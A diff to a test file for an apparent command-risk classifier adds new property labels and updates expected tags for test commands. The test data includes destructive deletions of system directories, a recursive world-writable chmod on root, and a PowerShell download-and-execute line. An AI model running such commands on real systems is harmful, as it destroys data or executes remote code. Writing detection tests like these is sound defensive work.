@@ -26,6 +26,9 @@ PIPE = "pipes_to_shell"
 PERM = "modifies_permissions"
 GIT = "git_history_rewrite"
 PKG = "package_install"
+REGEN = "targets_regenerable_path"
+UPLOAD = "network_upload"
+WRITE = "grants_write_access"
 
 # (command, confident, properties that must be True)
 CASES: list[tuple[str, bool, set[str]]] = [
@@ -68,7 +71,9 @@ CASES: list[tuple[str, bool, set[str]]] = [
     ("Remove-Item C:\\Windows\\System32\\drivers", True, {ROOT}),
     ("Remove-Item -Recurse C:\\Users\\alice", True, {R, HOME}),
     ("del /s /q C:\\temp", True, {R, F}),
-    ("del C:\\temp\\a.txt", True, set()),
+    # A file inside a scratch convention directory is disposable with it; the new
+    # targets_regenerable_path fact fires on the `temp` segment.
+    ("del C:\\temp\\a.txt", True, {REGEN}),
     ("DEL /S build", True, {R}),
     ("rd /s /q C:\\", True, {R, F, ROOT}),
     ("rmdir /s build", True, {R}),
@@ -118,7 +123,8 @@ CASES: list[tuple[str, bool, set[str]]] = [
     ("iex (New-Object Net.WebClient).DownloadString('https://x')", False, {NET, PIPE}),
     ("cat x | python3", False, {PIPE}),
     # --- permissions
-    ("chmod -R 777 /", True, {PERM, ROOT}),
+    # 777 grants write to group and other; the new grants_write_access fact fires.
+    ("chmod -R 777 /", True, {PERM, ROOT, WRITE}),
     ("chown alice file", True, {PERM}),
     ("icacls C:\\data /grant Everyone:F", True, {PERM}),
     ("takeown /f C:\\data", True, {PERM}),
